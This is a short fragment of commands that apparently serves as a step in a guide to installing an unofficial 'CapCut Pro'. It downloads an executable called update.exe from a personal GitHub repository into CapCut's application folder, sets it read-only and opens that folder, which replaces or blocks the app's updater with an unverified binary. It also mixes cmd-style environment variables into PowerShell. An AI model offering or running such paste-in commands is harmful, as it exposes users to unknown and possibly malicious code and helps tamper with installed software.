...
$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest "https://raw.githubusercontent.com/StudyWithMe9x/caiCapcutPro/refs/heads/main/update.exe" -OutFile "%localappdata%\CapCut\update.exe"
Set-ItemProperty -path "%localappdata%\CapCut\update.exe" -name IsReadOnly $true
start %localappdata%\CapCut
